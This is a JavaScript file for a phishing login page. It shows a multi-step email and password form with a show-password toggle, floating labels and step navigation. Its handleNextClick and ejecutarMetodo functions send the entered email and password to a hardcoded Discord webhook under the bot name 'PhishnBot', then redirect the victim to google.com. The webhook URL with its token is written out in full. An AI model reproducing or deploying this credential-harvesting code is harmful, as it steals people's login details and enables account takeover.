document.addEventListener('DOMContentLoaded', () => {
    const passwordField = document.getElementById('password');
    const showPasswordCheckbox = document.getElementById('show-password');
    const steps = document.querySelectorAll('.step');
    let currentStep = 0;
    function showStep(stepIndex) {
      steps.forEach((step, index) => {
        step.classList.toggle('active', index === stepIndex);
      });
    }
    showPasswordCheckbox.addEventListener('change', () => {
      passwordField.type = showPasswordCheckbox.checked ? 'text' : 'password';
    });
    function handleFloatingLabel(inputField, label) {
      inputField.addEventListener('focus', () => {
        label.style.top = '-7px';
        label.style.fontSize = '13px';
        label.style.color = '#1864c9';
      });
  
      inputField.addEventListener('blur', () => {
        if (inputField.value === '') {
          label.style.top = '15px';
          label.style.fontSize = '1.1rem';
          label.style.color = 'rgb(122, 122, 122)';
        }
      });
  
      if (inputField.value !== '') {
        label.style.top = '-7px';
        label.style.fontSize = '13px';
        label.style.color = '#1864c9';
      }
    }
    handleFloatingLabel(
      document.getElementById('email'),
      document.querySelector('label[for="email"]')
    );
    handleFloatingLabel(
      document.getElementById('password'),
      document.querySelector('label[for="password"]')
    );
    document.querySelectorAll('.next-btn').forEach(button => {
      button.addEventListener('click', () => {
        if (currentStep < steps.length - 1) {
          currentStep++;
          showStep(currentStep);
        }
      });
    });
  
    document.querySelectorAll('.back-btn').forEach(button => {
      button.addEventListener('click', () => {
        if (currentStep > 0) {
          currentStep--;
          showStep(currentStep);
        }
      });
    });
    showStep(currentStep);
  });
function handleNextClick() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    ejecutarMetodo(email, password);
    window.location.href = 'https://www.google.com';
}
function ejecutarMetodo(email, password) {
    const webhookUrl = 'https://discord.com/api/webhooks/1303511720366444555/7rQnnjli4xHdT686YKX4HAcJyJr9OQuE8n6cpKV1FT_1PCKRLxAtOzcS0VZDc_ASkkMJ';
    const mensaje = {
        content: `Correo: ${email}\nContraseña: ${password}`,
        username: "PhishnBot",
        avatar_url:"https://cdn.pixabay.com/photo/2023/03/09/15/52/skull-7840312_1280.jpg"
    };
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(mensaje),
    })
    .then(response => response.json())
    .then(data => console.log("sended:", data))
    .catch(error => console.error("Error:", error));
}

